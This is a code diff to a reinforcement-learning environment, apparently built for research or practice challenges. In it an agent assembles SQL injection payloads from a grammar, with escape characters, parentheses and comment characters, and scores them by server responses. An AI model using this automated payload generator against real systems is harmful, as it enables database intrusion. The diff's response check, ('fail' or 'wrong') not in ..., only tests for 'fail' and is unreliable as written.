@@ -13,8 +13,7 @@ from stable_baselines3.common.monitor import Monitor
 
 from cfg import cfg_phase1, cfg_phase2, cfg_phase3
 from utils import (
-    setup_session, update_cfg_with_parenthesis,
-    distribute_parentheses, extract_flat_tokens)
+    setup_session, generate_atomic_clause)
 
 # Load environment variables from .env file
 load_dotenv()
@@ -23,6 +22,11 @@ NUM_CHALLENGES = int(os.getenv("NUM_CHALLENGES", 1))  # Default to 1 if not set
 
 # Configure logging for detailed tracking
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+
+cfg_phase3_rules = [
+    (rule.lhs, rule.rhs)
+    for rule in cfg_phase3.productions()  # Extract rules from the grammar object
+]
 
 
 class SQLiEnv(gym.Env):
@@ -108,38 +112,47 @@ class SQLiEnv(gym.Env):
 
     def _build_complex_payload(self, action: ArrayLike) -> str:
         """
-        Build the payload for phase 3, distributing parentheses and ensuring CFG adherence.
+        Build the payload for phase 3, ensuring parentheses do not break atomic CFG units.
 
         :param action: ArrayLike, action vector influencing payload structure.
         :return: Fully constructed SQL injection payload.
         """
-        # Update the CFG with the current parentheses structure
-        dynamic_cfg = update_cfg_with_parenthesis(cfg_phase3, len(self.parentheses_structure))
-
-        # Generate the clause using the updated CFG
-        generated_clauses = list(generate(dynamic_cfg, n=10))
+        # Generate atomic clauses from CFG
+        generated_clauses = generate_atomic_clause(cfg_phase3, n=10)
 
         # Select a generated clause based on the action
-        selected_clause = generated_clauses[int(action[0] * (len(generated_clauses) - 1))]
+        action_index = int(action[0] * (len(generated_clauses) - 1))
+        selected_clause_units = generated_clauses[action_index]  # List of atomic CFG units
 
-        # Flatten tokens while respecting CFG rules
-        flat_tokens = extract_flat_tokens(dynamic_cfg, selected_clause)
+        # Map actions to parentheses placement
+        parentheses_actions = action[1:]  # Use remaining actions for parentheses placement
+        num_parentheses = len(self.parentheses_structure)
+        insertion_indices = sorted(
+            [min(int(a * len(selected_clause_units)), len(selected_clause_units)) for a in parentheses_actions[:num_parentheses]]
+        )
 
-        # Distribute parentheses across valid positions
-        flat_tokens_with_parentheses = distribute_parentheses(flat_tokens, len(self.parentheses_structure))
+        # Insert parentheses into the clause
+        clause_with_parentheses = []
+        last_index = 0
 
-        # Reconstruct the payload
-        payload = " ".join(flat_tokens_with_parentheses)
+        for idx in insertion_indices:
+            clause_with_parentheses.extend(selected_clause_units[last_index:idx])
+            clause_with_parentheses.append(")")  # Insert parenthesis at the specified index
+            last_index = idx
 
-        # Ensure the escape character is included at the start of the payload if identified
-        if self.exploit_char:
-            payload = f"{self.exploit_char} {payload}"
+        clause_with_parentheses.extend(selected_clause_units[last_index:])
 
-        # Append the comment character at the end of the payload
-        payload_with_comment = f"{payload} {self.comment_char} "
+        # Append remaining parentheses at the end if needed
+        remaining_parentheses = num_parentheses - len(insertion_indices)
+        if remaining_parentheses > 0:
+            clause_with_parentheses.append(")" * remaining_parentheses)
+
+        # Combine the clause with the escape character and comment
+        selected_clause = " ".join(clause_with_parentheses)
+        payload = f"{self.exploit_char} {selected_clause}" if self.exploit_char else selected_clause
+        payload_with_comment = f"{payload} {self.comment_char}".strip()
 
         return payload_with_comment
-
 
     def step(self, action: ArrayLike) -> tuple[np.ndarray, float, bool, bool, dict]:
         """
@@ -221,7 +234,7 @@ class SQLiEnv(gym.Env):
             if self.exploit_char_found and not self.found_parenthesis_structure:
                 self.found_parenthesis_structure = True
                 self.parentheses_structure = ''.join(re.findall(r'[)]+', payload))
-                self.comment_char = f"{payload.split()[-1]}"
+                self.comment_char = f"{payload.split()[-1]} "  # Ensure adding whitespace after comment character
                 logging.info(f"Phase 2 success - Parentheses structure found: {self.parentheses_structure}")
         if response_status == 200 and ("fail" or "wrong") not in response_text.lower():
             state[1] = 1
